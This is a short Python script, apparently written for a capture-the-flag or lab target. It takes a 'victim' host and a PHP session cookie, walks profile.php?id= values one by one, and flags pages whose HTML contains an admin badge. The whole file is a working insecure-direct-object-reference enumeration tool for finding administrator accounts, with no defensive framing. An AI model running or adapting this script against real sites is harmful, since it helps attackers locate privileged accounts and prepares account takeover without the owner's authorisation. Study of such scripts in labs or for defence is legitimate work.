import requests
print("Author: iMusial")

target = str(input("Host/victim IP address: "))
phpCookie = input("PHP Cookie: ")
requestAmnt = int(input("Request amount: ")) #How many different pages to request, for example, entering 3 will query URLs with id paramaters from id=1 to id=3


session = requests.Session()
session.headers.update({"Host": target, "User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive", "Cookie": phpCookie, "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"})
session.cookies.update({"Cookie":phpCookie})

adminPages=[]

for i in range(requestAmnt):
    url = "http://" + target + "/profile.php?id=" + str(i)
    print("[-] testing " + url)
    response = session.get(url)
    if response.text.find("class=\"rx-badge rx-badge-admin\"") != -1: #hyper-specific HTML that lies in admin pages
        adminPages.append(url)

print("\n[-] Finished")

for url in adminPages:
    print("[+] admin page found at: " + url )
